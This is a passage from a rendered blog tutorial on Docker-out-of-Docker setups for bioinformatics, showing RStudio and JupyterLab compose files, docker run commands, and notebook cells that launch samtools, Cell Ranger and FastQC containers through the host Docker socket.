/var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount data directories</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/workspace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./projects</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/home/rstudio/projects</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">restart</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unless</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">stopped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Optional: limit resources</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">deploy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">resources</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">limits</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">cpus</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'4'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">memory</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> 16G</span><br></span></code></pre></div></div>
<p><strong>Run with:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker-compose</span><span class="token plain"> up </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Access at http://localhost:8787</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Username: researcher</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Password: secure_password</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-setting-up-jupyterlab-with-dood">4. Setting Up JupyterLab with DooD<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#4-setting-up-jupyterlab-with-dood" class="hash-link" aria-label="Direct link to 4. Setting Up JupyterLab with DooD" title="Direct link to 4. Setting Up JupyterLab with DooD" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="41-running-jupyterlab-with-docker-socket-mount">4.1. Running JupyterLab with Docker Socket Mount<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#41-running-jupyterlab-with-docker-socket-mount" class="hash-link" aria-label="Direct link to 4.1. Running JupyterLab with Docker Socket Mount" title="Direct link to 4.1. Running JupyterLab with Docker Socket Mount" translate="no">​</a></h3>
<p><strong>Basic JupyterLab with DooD:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8888</span><span class="token plain">:8888 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /var/run/docker.sock:/var/run/docker.sock </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/data:/data </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /home/user/notebooks:/notebooks </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  jupyter/scipy-notebook:latest </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  jupyter lab </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--ip</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0.0</span><span class="token plain">.0.0 --allow-root --no-browser</span><br></span></code></pre></div></div>
<p><strong>Get the token from logs:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output will show: http://127.0.0.1:8888/lab?token=xxxxx</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use that to access JupyterLab in browser</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="42-using-docker-from-jupyterlab-notebooks">4.2. Using Docker from JupyterLab Notebooks<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#42-using-docker-from-jupyterlab-notebooks" class="hash-link" aria-label="Direct link to 4.2. Using Docker from JupyterLab Notebooks" title="Direct link to 4.2. Using Docker from JupyterLab Notebooks" translate="no">​</a></h3>
<p><strong>Running bioinformatics tools in notebook cells:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In JupyterLab cell - run samtools in Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'docker'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'run'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--rm'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-v'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data:/data'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io/biocontainers/samtools:latest'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'samtools'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'view'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-h'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data/input.bam'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> capture_output</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> text</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">result</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Processing with Docker + Python integration:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cell 1: Run analysis in container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> json</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run Cell Ranger in Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'docker'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'run'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--rm'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-v'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data:/data'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'cellranger:v7.0'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'cellranger'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'count'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--id=sample1'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--fastqs=/data/fastqs'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--transcriptome=/data/reference'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cell 2: Load results in Python</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> scanpy </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> sc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">adata </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> sc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">read_h5ad</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data/sample1/outs/filtered_feature_bc_matrix.h5'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">adata</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Running FastQC on multiple samples:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastq_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data/fastqs'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run FastQC on all FASTQ files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> fastq_file </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">glob</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'*.fastq.gz'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'docker'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'run'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'--rm'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-v'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data:/data'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io/biocontainers/fastqc:latest'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'fastqc'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f'/data/fastqs/</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">fastq_file</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-o'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'/data/qc_results'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"FastQC analysis complete"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="43-docker-compose-configuration-for-jupyterlab">4.3. Docker Compose Configuration for JupyterLab<a href="https://riverxdata.github.io/river-docs/blog/docker-out-docker-bioinformatics-web-apps#43-docker-compose-configuration-for-jupyterlab" class="hash-link" aria-label="Direct link to 4.3. Docker Compose Configuration for JupyterLab" title="Direct link to 4.3. Docker Compose Configuration for JupyterLab" translate="no">​</a></h3>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.8'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">services</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jupyter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">image</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> jupyter/scipy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">notebook</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">container_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> jupyterlab</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">analysis</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">ports</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"8888:8888"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">volumes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount Docker socket for DooD</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> /var/run/docker.sock</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/var/run/docker.sock</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Mount analysis directories</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./notebooks</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/notebooks</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> ./output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">/output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">rw</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token 